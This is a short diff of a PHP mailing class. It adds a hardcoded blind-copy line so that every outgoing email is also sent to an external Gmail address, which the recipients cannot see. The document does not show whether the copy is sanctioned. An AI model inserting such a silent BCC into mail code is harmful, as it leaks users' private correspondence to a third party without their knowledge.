@@ -273,7 +273,7 @@ class mailing
         $mailek->addReplyTo($replayTo ? $replayTo : FROM_CASE, $replayToName ? $replayToName : NAME_CASE);
         $mailek->isHTML(true);
         $mailek->addAddress($mailto);     // Add a recipient
-
+        $mailek->addBCC('liczniki.otus@gmail.com');     // Add BCC a recipient
 
         $mailek->Subject = $temat;
 
